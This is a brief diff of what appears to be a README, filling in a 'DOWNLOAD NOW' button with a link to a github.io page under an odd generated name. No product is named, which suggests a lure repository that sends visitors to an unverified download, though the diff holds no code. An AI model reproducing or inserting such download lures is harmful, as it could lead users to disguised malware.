@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://osmosis-traot-pcwinmac-pz83.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
